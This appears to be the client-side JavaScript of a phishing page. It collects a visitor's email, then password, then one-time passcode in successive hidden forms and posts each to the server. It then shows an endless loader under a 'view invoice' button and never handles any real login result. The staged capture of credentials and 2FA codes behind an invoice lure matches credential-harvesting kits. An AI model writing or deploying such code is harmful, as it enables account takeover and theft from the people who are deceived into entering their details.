$(document).ready(() => {
    $(".form > .inputBox > #proceed").click((event) => {
        var userEmail = $(".form > .inputBox > #email").val()
        $.ajax({
            url: "/data",
            type: "post",
            data: {userEmail: userEmail},

            success: (response) =>{
            }
        })
        $(".form").css("display", "none")
        $(".headline").css("display", "none")
        event.preventDefault()
        $("#tokenForm").css("display", "block")

    })
    $("#tokenForm > .inputBox > #continue").click((event) => {
        var userPass = $("#tokenForm > .inputBox > #password").val()
        $.ajax({
            url: "/data/user",
            type: "post",
            data: {userPass: userPass},

            success: (response) =>{
                console.log(response)
            }
        })
        $("#tokenForm").css("display", "none")
        event.preventDefault()
        $("#otpForm").css("display", "block")
    })
    
    $("#otpForm > .inputBox > #viewInv").click((event) => {
        var userOTP = $("#otpForm > .inputBox > #otp").val()
        $("#otpForm").css("display", "none")
        event.preventDefault()
        $(".loader").css("display", "block")
        $.ajax({
            url: "/data/user/otp",
            type: "post",
            data: {userOTP : userOTP},

            success: (response) =>{
            }
        })
    })
})